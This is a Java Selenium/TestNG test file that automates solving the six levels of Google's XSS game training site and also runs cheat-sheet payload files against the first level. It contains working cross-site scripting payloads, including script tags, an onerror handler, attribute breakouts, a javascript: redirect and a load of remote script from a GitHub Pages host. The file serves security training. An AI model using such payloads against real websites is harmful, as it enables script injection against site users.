package com.appspot.xssgame.tests;

import com.appspot.xssgame.listeners.TestListener;
import com.appspot.xssgame.pages.*;
import org.testng.annotations.DataProvider;
import org.testng.annotations.Listeners;
import org.testng.annotations.Test;


@Listeners(TestListener.class)
public class XssTest extends BaseTest {

    @Test
    public void testGame(){
        FirstLevelPage
                .open(driver)
                .enterQuery("<script>alert('XSS');</script>")
                .submit()
                .closeAlertAndGoToTheSecondLevel()

                .enterText("<Img src = x onerror=\"javascript:alert(1)\">")
                .submit()
                .closeAlertAndGoToTheThirdLevel()

                .enterUrl(ThirdLevelPage.FRAME_URL+"#3' onerror='alert(\"xss\")'")
                .clickGo()
                .closeAlertAndGoToTheFourthLevel()

                .enterTimerValue("1');alert('xss")
                .submit()
                .closeAlertAndGoToTheFifthLevel()

                .enterUrl(FifthLevelPage.FRAME_URL+"/signup?next=javascript:alert(\"xss\");")
                .pressEnterOnUrlBar()
                .enterEmail("email")
                .clickNextLink()
                .closeAlertAndGoToTheSixLevel()

                .enterUrl(SixLevelPage.FRAME_URL+"#htTps://mariaoskar.github.io/XSSTest/alert.js")
                .clickGo()
                .closeAlertAndGoToTheSuccessPage()
                .getCongratulations();

    }

    @Test(dataProvider = "CheatSheetVar")
    public void testVar(String xss){
        FirstLevelPage
                .open(driver)
                .enterQuery(xss)
                .submit()
                .checkMySecretVariable();
    }

    @Test(dataProvider = "CheatSheetAlert")
    public void testAlert(String query){
        FirstLevelPage
                .open(driver)
                .enterQuery(query)
                .submit()
                .closeAlert();
    }

    @DataProvider(name = "CheatSheetVar")
    public Object[][] cheatSheet(){
        return getDataFromFile("CheatSheetVar.txt");
    }

    @DataProvider(name = "CheatSheetAlert")
    public Object[][] cheatSheetOriginal(){
        return getDataFromFile("CheatSheetAlert.txt");
    }


}
